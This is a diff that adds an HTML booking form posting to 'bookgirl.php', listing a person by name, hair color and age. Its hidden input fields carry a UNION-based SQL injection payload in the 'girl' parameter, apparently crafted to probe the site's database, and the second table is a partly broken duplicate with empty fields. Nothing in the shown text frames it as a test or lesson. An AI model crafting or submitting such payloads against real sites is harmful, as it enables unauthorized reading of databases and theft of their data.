@@ -1,0 +1,16 @@
+<form method="post" action="bookgirl.php" name="input">
+<table cellspacing="2" cellpadding="2" border="1">
+<input type="hidden" value="Claudia\' UNION ALL SELECT null, null, null \'" name="girl">
+<tbody><tr><td>Name:</td><td>Claudia</td></tr>
+<tr><td>Hair color:</td><td>Brunette</td></tr>
+<tr><td>Age:</td><td>18</td></tr>
+<tr><td><input type="submit" value="Book"></td></tr>
+</tbody></table>
+<table cellspacing="2" cellpadding="2" border="1">
+<input type="" value="Claudia\' UNION ALL SELECT null, null, null \'" name="girl">
+<tbody><tr><td>Name:</td><td></td></tr>
+<tr><td>Hair color:</td><td></td></tr>
+<tr><td>Age:</td><td></td></tr>
+<tr><td><input type="submit" value="Book"></td></tr>
+</tbody></table>
+</form>
